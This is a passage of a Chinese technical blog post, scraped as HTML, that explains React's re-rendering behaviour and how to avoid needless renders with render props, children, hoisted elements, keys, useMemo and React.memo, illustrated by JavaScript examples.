<p><strong>注意：</strong> 你看到了renderTimes每次都会加 2，这不是 bug，在 React 的开发模式中，每次更新都会渲染两次，以便于检查你写的useEffect有没有正确消除 effect， <a href="https://link.juejin.cn?target=https%3A%2F%2Flegacy.reactjs.org%2Fdocs%2Fstrict-mode.html%23ensuring-reusable-state" target="_blank" title="https://link.juejin.cn?target=https%3A%2F%2Flegacy.reactjs.org%2Fdocs%2Fstrict-mode.html%23ensuring-reusable-state">官方文档</a>。</p>
<p><strong>小结</strong></p>
<ul>
<li>虽然 React 的更新会从根节点开始遍历，但是只有更新节点的子树会被重新渲染，祖先节点不会被重新渲染</li>
<li>即便更新节点的子节点没有任何变化，也会被重新渲染</li>
</ul>
<h3 data-id="heading-2">规避渲染</h3>
<p>现在我们知道 React 更新渲染的基本规则，接下去要讨论的就是如何进行优化。</p>
<p>但在正式开始之前，我们要知道的是，即便你不做任何优化，对于大部分的应用来说，React 的性能也是够用的，你把各种优化加上有时候反而会适得其反， 这也是为什么很多开发者其实并不完全理解 React 的更新机制，甚至一些理解的开发者也并不能第一眼就看出代码是否有优化空间， 但是 React 仍然是世界上使用最多的前端框架，并且大部分用其开发的应用都是正常运行的。</p>
<p><strong>所以很多时候，而是先专注于实现，然后回过头去用 Profiler 这类工具去分析你的应用， 然后再针对有性能问题的地方去做优化，这样的做法在大多数情况下是更有效且高效的。</strong></p>
<h4 data-id="heading-3">重新思考你的组件结构</h4>
<p>我们来看下面一个例子</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcodesandbox.io%2Fs%2Fflamboyant-https-yylfcm%3Ffile%3D%2Fsrc%2FApp.tsx" target="_blank" title="https://codesandbox.io/s/flamboyant-https-yylfcm?file=/src/App.tsx" ref="nofollow noopener noreferrer">codesandbox.io/s/flamboyan…</a></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">let</span> menuRenderTime = <span class="hljs-number">0</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Menu</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span>Menu Render Times: {menuRenderTime++}<span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span></span>;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Nav</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useState</span>(<span class="hljs-string">"light"</span>);

    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">Menu</span> /&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span>
                <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setTheme(theme === "light" ? "dark" : "light")}
            &gt;
                Theme: {theme}
            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    );
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">Nav</span> /&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Content<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    );
}
</code></pre>
<p>这是一个非常常见的例子，我们的应用包含了一个导航栏，导航栏里面有一个菜单，同时导航栏还包含一个切换主题的按钮， 我相信大部分人在遇到这么一个需求的时候，第一反应应该也就是这么去实现，而在这个例子里就隐藏着一个可以优化的地方。 我们先来看这个例子，现在点击切换主题时，Menu组件每次都会重新渲染，很显然符合我上面说到的子组件会因为祖先组件的渲染而重新渲染。</p>
<p>而我们可以通过简单地调整Nav和Menu之间的关系来规避这个问题，这就是 renderProps，来看我如何改造组件</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcodesandbox.io%2Fp%2Fsandbox%2Fdts559%3Ffile%3D%252Fsrc%252FApp.js%253A17%252C11" target="_blank" title="https://codesandbox.io/p/sandbox/dts559?file=%2Fsrc%2FApp.js%3A17%2C11" ref="nofollow noopener noreferrer">codesandbox.io/p/sandbox/d…</a></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">let</span> menuRenderTime = <span class="hljs-number">0</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Menu</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span>Menu Render Times: {menuRenderTime++}<span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span></span>;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Nav</span>(<span class="hljs-params">{ renderMenu }</span>) {
    <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useState</span>(<span class="hljs-string">"light"</span>);

    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            {renderMenu}
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span>
                <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setTheme(theme === "light" ? "dark" : "light")}
            &gt;
                Theme: {theme}
            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    );
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">Nav</span> <span class="hljs-attr">renderMenu</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Menu</span> /&gt;</span>} /&gt;
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Content<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    );
}
</code></pre>
<p>现在你切换主题时Menu组件就不会再重新渲染了，这里就利用到了上面总结的第一点，子组件的更新不会引起祖先节点的重新渲染， 在这个例子里，Nav是App的子节点，其更新并不会让App节点重新渲染，而Menu是App渲染过程中被创建的， App没有重新渲染，说明Menu节点没有被重新创建，其复用的仍然是上一次渲染时创建的Element。</p>
<p>所以结论就是，相较于：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">C</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> /&gt;</span></span>;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">B</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">C</span> /&gt;</span></span>;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">A</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">B</span> /&gt;</span></span>;
}
</code></pre>
<p>这样递归嵌套的组件结构，我更推荐这样的结构：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">C</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> /&gt;</span></span>;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">B</span>(<span class="hljs-params">{ children }</span>) {
    <span class="hljs-keyword">return</span> children;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">A</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">B</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">C</span> /&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">B</span>&gt;</span></span>
    );
}
</code></pre>
<p>在 React 中，<strong>children其实也是一个prop</strong>，只是一般我们习惯把 children 和 props 分开来对待，所以很多同学可能会下意识地认为 children 和 props 是不同的东西。</p>
<p>那么归结到这个例子里面，因为App节点没有重新渲染，所以我们没有重新创建Menu组件地节点（通过createElement），因此 Nav 组件的 props 是没有任何变化的， <strong>他拿到的 Menu 组件的 Element 和前一次渲染的是完全相同的实例！</strong> 而这才是在这种 case 下面 C 节点没有重新渲染的根本原因。我们可以通过代码来进行验证：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcodesandbox.io%2Fp%2Fsandbox%2F4gp4vy%3Ffile%3D%252Fsrc%252FApp.js%253A24%252C5" target="_blank" title="https://codesandbox.io/p/sandbox/4gp4vy?file=%2Fsrc%2FApp.js%3A24%2C5" ref="nofollow noopener noreferrer">codesandbox.io/p/sandbox/4…</a></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">let</span> menuRenderTime = <span class="hljs-number">0</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Menu</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span>Menu Render Times: {menuRenderTime++}<span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span></span>;
}

<span class="hljs-keyword">let</span> lastMenuElement = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Nav</span>(<span class="hljs-params">{ renderMenu }</span>) {
    <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useState</span>(<span class="hljs-string">"light"</span>);

    <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
        lastMenuElement = renderMenu;
    }, [renderMenu]);

    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            {renderMenu}
            Menu Changed: {renderMenu === lastMenuElement ? "No" : "Yes"}
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span>
                <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setTheme(theme === "light" ? "dark" : "light")}
            &gt;
                Theme: {theme}
            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    );
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">Nav</span> <span class="hljs-attr">renderMenu</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Menu</span> /&gt;</span>} /&gt;
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Content<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    );
}
</code></pre>
<h6 data-id="heading-4">owner vs children</h6>
<p>在上面的例子里，Menu 节点的 owner 是 App，而它是 Nav 节点的 children，所以这里引出一个结论：</p>
<p><strong>节点是否重新渲染会受到 owner 的影响，但和 parent 并不是直接相关。</strong></p>
<p>理解 owner 和 children 的区别对于理解 React 的一些概念还是非常有帮助的，但是 React 官方其实并没有给出这样的概念，所以这里我只是给出了一个比较形象的图示，</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45162ed3e9024766a7c6f0f0b24aec9b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVGlmZmFueQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892093&amp;x-signature=UTwhT8eiBXEVD6vpGwRbobEjtpo%3D" alt="" loading="lazy"/></p>
<p>简单来说，owner 就是创建当前节点的节点，比如在这个例子里的Menu，他的创建在App中时，他的 owner 就是App，而如果是在 Nav 里面，则 owner 是 Nav。 对比这个结果我们可以发现，影响Menu节点是否重新渲染的根本原因，是其 owner 是否重新渲染，因为一旦 owner 重新渲染，就会引起Menu节点的重新创建， 就会让Menu节点需要被重新渲染。</p>
<p>那么是不是只要节点的对象没有变化，就可以规避重新渲染呢？没错，这就是接下去我们要聊的第二点。</p>
<h4 data-id="heading-5">保持节点不变</h4>
<h5 data-id="heading-6">使用key优化节点对比</h5>
<p>在 React 中，<code>key</code> 属性用于优化 Virtual DOM 中节点的对比过程。具体来说，<code>key</code> 的作用包括：</p>
<ol>
<li><strong>唯一标识</strong>:</li>
</ol>
<ul>
<li>
<ul>
<li><code>key</code> 为每个元素提供唯一标识，帮助 React 在列表更新时识别哪些元素发生了变化。</li>
</ul>
</li>
</ul>
<ol start="2">
<li><strong>高效更新</strong>:</li>
</ol>
<ul>
<li>
<ul>
<li>当组件更新时，React 使用 <code>key</code> 来快速判断哪些元素是新增、删除或移动的。</li>
<li>通过 <code>key</code>，React 可以复用相同 <code>key</code> 的组件实例，避免不必要的重新渲染。</li>
</ul>
</li>
</ul>
<ol start="3">
<li><strong>避免不必要的操作</strong>:</li>
</ol>
<ul>
<li>
<ul>
<li>使用 <code>key</code> 能防止由于错误对比而导致的组件状态丢失或不必要的重排。</li>
<li>提高性能，尤其是在列表的元素发生排序或频繁更新时。</li>
</ul>
</li>
</ul>
<p>总之，合理使用 <code>key</code> 可以显著提升 React 应用的渲染性能和准确性。通常建议使用唯一且稳定的标识（如数据库中的 ID）作为 <code>key</code>。</p>
<h5 data-id="heading-7">减少节点的无效创建</h5>
<p>严格来说，上面的例子也就是保持了节点不变，所以规避了Menu节点的无用渲染，只是因为造成节点不变的原因来自 React 自身的算法优化，所以我单独拿出来说， 而这一节则会围绕更 common 的场景来讲解。我们仍然来看一个例子，这个例子会简单很多：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcodesandbox.io%2Fp%2Fsandbox%2Fr5qtgt%3Ffile%3D%252Fsrc%252FApp.js%253A10%252C15" target="_blank" title="https://codesandbox.io/p/sandbox/r5qtgt?file=%2Fsrc%2FApp.js%3A10%2C15" ref="nofollow noopener noreferrer">codesandbox.io/p/sandbox/r…</a></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">let</span> menuRenderTime = <span class="hljs-number">0</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Menu</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span>Menu Render Times: {menuRenderTime++}<span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span></span>;
}

<span class="hljs-keyword">const</span> menuElement = <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Menu</span> /&gt;</span></span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            {menuElement}
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount((c) =&gt; c + 1)}&gt;
                Count: {count}
            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    );
}
</code></pre>
<p>我简化了之前的例子，同样保持了 Menu 组件不会随着父组件的重新渲染而渲染，而这个实现就非常简单，我把menuElement的创建挪到了App组件外面， 这样的结果是，menuElement的创建只会发生一次，而不会随着App组件的重新渲染而重新创建，而借此让Menu节点规避了因为祖先节点的重新渲染而引起的无效渲染。</p>
<p>需要注意这种方式并不会导致Menu组件内部的setState失效，我们可以通过代码来验证：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcodesandbox.io%2Fp%2Fsandbox%2Frd3sk3%3Ffile%3D%252Fsrc%252FApp.js%253A19%252C15" target="_blank" title="https://codesandbox.io/p/sandbox/rd3sk3?file=%2Fsrc%2FApp.js%3A19%2C15" ref="nofollow noopener noreferrer">codesandbox.io/p/sandbox/r…</a></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">let</span> menuRenderTime = <span class="hljs-number">0</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Menu</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span>
            Menu Render Times: {menuRenderTime++}
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount((c) =&gt; c + 1)}&gt;
                Menu Count: {count}
            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span></span>
    );
}

<span class="hljs-keyword">const</span> menuElement = <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Menu</span> /&gt;</span></span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            {menuElement}
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount((c) =&gt; c + 1)}&gt;
                Count: {count}
            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    );
}
</code></pre>
<p><strong>所以如果要论如何优化 React 的渲染性能，很大的一个方向其实就是减少节点的无效创建</strong>，这一方面减少了createElement的调用次数， 另一方面大大规避了无效渲染，但是这种方式为什么并没有被广泛推广呢？主要是因为其可维护性不高，因为你需要把具体某几个节点单独提出去声明， 这让节点渲染脱离了常规的节点流，而等到你的业务变得复杂，你可能很难避免需要传递一些 props 给该组件，这时候你就需要把这个组件提升到父组件中， 那代码改起来就变得非常的麻烦。</p>
<p><strong>另外一种方式是不把Menu提到App之外，而是放到useMemo中</strong>，这也是可行的，但是这会引入useMemo的计算成本，你可能需要去评估这个成本是否值得， 而却虽然方便了一些，但是仍然维护起来比较麻烦。</p>
<p>不过 React 提供了一种更符合使用习惯的优化方式，那就是<strong>React.memo</strong>，这个 API 的作用就是让组件变成一个纯组件，也就是说，如果组件的props没有变化， 那么就不会重新渲染。</p>
<h4 data-id="heading-8">React.memo</h4>
<p>React.memo其实就是函数组件版的PureComponent，当你使用memo来定义一个组件的时候，memo会在发现组件需要重新渲染的时候， 先去 check 一遍组件的props是否变化，他的默认 check 算法是shallowEqual，也就是只比较props对象的直接属性，并且直接===来对比， 如果 prop 是对象，他也是直接对比对象的引用是否相同，所以总体来说比较算法的成本是很低的，大概率比组件重新渲染要低很多。</p>
<p>React 的 issue 里也有一个讨论 React 是否应该默认开启memo的帖子，可以看到很多用户其期望可以默认开启memo的， 因为几乎百分之 95%以上的情况（甚至可能更高），你把所有组件都开启memo是没有什么负面影响的，却可以规避大部分的无效渲染， 是属于何乐而不为的事情。有兴趣的同学可以去这个<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffacebook%2Freact%2Fissues%2F14463" target="_blank" title="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffacebook%2Freact%2Fissues%2F14463">issue</a>看看大佬们的讨论。</p>
<p>总结一下为什么 React 官方不考虑默认开启memo的原因：</p>
<ul>
<li>兼容老代码，React 的向前兼容是出了名的牛，甚至 5-6 年前的代码现在升级到 18 大概率还能正常运行，只是多了很多 warning， 而因为考虑默认开启memo是对 React 的渲染机制的一种破坏性更新，即便大部分的代码不会受影响，但是出于兼容性的考虑，也不会默认开启</li>
<li>有一些极端的 Case 可能会因为加了memo无法正常工作，比如在一些使用响应式编程来维护组件状态的情况，当然我并没有碰到过类似 case， 一方面我不喜欢在 React 中用响应式，另外一方面即便是响应式编程也需要一些极端的情况才会出现。</li>
<li>不开启memo性能也没有那么差，还是那句话，大部分情况下，即便你不做任何优化，React 的性能也是足够的，如果你发现哪里性能有问题， 你再渐进式地去加memo就可以，这属于 React 地一种设计哲学吧，你可以不认可，但也不能否认他也有正确地地方。</li>
</ul>
<p>关于 memo 的使用我就不单独举例了，相信大家都用到过，memo 其实就是组件级别的 useMemo，而 props 中的所有属性就是 useMemo 中第二个参数中的数组， memo 只要发现 props 没有变化，就会直接返回之前已经创建过的 Element，也就符合了我上一节中提到的优化方式，却又没有代码难以维护的问题。</p>
<p><strong>注意：</strong> memo并没有规避渲染，而是把重复渲染这件事交给了memo返回的HOC，而这个组件只做了一件事，也就是判断props是否变化，如果没有变化就返回他cache的节点， 内部实现有点类似：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">memo</span>(<span class="hljs-params">Comp</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">MemoHOC</span>(...props) {
        <span class="hljs-keyword">const</span> element = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Comp</span> {<span class="hljs-attr">...props</span>} /&gt;</span></span>
        }, [...<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(props)]) <span class="hljs-comment">// 当然这里需要排序一下</span>

        <span class="hljs-keyword">return</span> element
    }
}
</code></pre>
<h2 data-id="heading-9">结语</h2>
<p>一个词概括就是<strong>机制</strong>，React设计如此，他的更新就是组件树级别的，如果你时不时打开Profiler看看，你会发现很多时候你的代码大概率就是只有几个叶子节点在更新，只要不犯类似频繁更新Context这样的基本错误。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[数仓-湖仓-湖流，人力家基于阿里云 OpenLake 架构演进与思考]]></title>    <link>https://juejin.cn/post/7603195960254398464</link>    <guid>https://juejin.cn/post/7603195960254398464</guid>    <pubDate>2026-02-05T10:42:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603195960254398464" data-draft-id="7602936997176033332" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="数仓-湖仓-湖流，人力家基于阿里云 OpenLake 架构演进与思考"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-02-05T10:42:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿里云大数据AI技术"/> <meta itemprop="url" content="https://juejin.cn/user/2414974667341287"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            数仓-湖仓-湖流，人力家基于阿里云 OpenLake 架构演进与思考
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2414974667341287/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿里云大数据AI技术
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:42:33.000Z" title="Thu Feb 05 2026 10:42:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读23分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul 